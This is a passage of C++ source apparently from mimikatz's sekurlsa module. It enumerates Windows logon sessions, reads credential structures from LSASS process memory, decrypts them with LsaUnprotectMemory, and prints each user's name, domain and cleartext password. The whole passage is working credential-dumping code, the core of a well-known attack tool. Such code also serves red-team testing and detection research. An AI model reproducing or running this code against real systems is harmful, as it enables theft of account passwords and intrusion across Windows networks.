			wstring userName	= mod_process::getUnicodeStringOfProcess(&mesCreds->UserName, hLSASS);
			wstring domainName	= mod_process::getUnicodeStringOfProcess(&mesCreds->Domaine, hLSASS);
			wstring password	= mod_process::getUnicodeStringOfProcess(&mesCreds->Password, hLSASS, SeckPkgFunctionTable->LsaUnprotectMemory);
			wstring rUserName	= (isDomainFirst ? domainName : userName);
			wstring rDomainName	= (isDomainFirst ? userName : domainName);

			if(justSecurity)
			{
				if(!pos)
					wcout << password;
				else
					wcout << endl <<
						L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
			}
			else
			{
				if(!pos)
					wcout << endl <<
						L"\t * User        : " << rUserName << endl <<
						L"\t * Domain      : " << rDomainName << endl <<
						L"\t * Password    : " << password;
				else
					wcout << endl <<
						L"\t * [" << *pos  << L"] User        : " << rUserName << endl <<
						L"\t       Domain      : " << rDomainName << endl <<
						L"\t       Password    : " << password;
			}
		}
	}// else wcout << L"n.t. (LUID KO)";
}

bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders)
{
	PLUID sessions;
	ULONG count;

	if (NT_SUCCESS(LsaEnumerateLogonSessions(&count, &sessions)))
	{
		for (ULONG i = 0; i < count ; i++)
		{
			PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
			if(NT_SUCCESS(LsaGetLogonSessionData(&sessions[i], &sessionData)))
			{
				if(sessionData->LogonType != Network)
				{
					wcout << endl <<
						L"Authentication ID         : " << sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
						L"Authentication Package    : " << mod_text::stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
						L"Primary user              : " << mod_text::stringOfSTRING(sessionData->UserName) << endl <<
						L"Domain authentication     : " << mod_text::stringOfSTRING(sessionData->LogonDomain) << endl;

					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
					{
						wcout << L'\t' << monProvider->second << (mesArguments->empty() ? (L" :") : (L"")) << L'\t';
						monProvider->first(&sessions[i], mesArguments->empty());
						wcout << endl;
					}
				}
				LsaFreeReturnBuffer(sessionData);
			}
			else wcout << L"Error: Unable to get session data" << endl;
		}
		LsaFreeReturnBuffer(sessions);
	}
	else wcout << L"Error: Unable to enumerate the current sessions" << endl;

	return true;
}
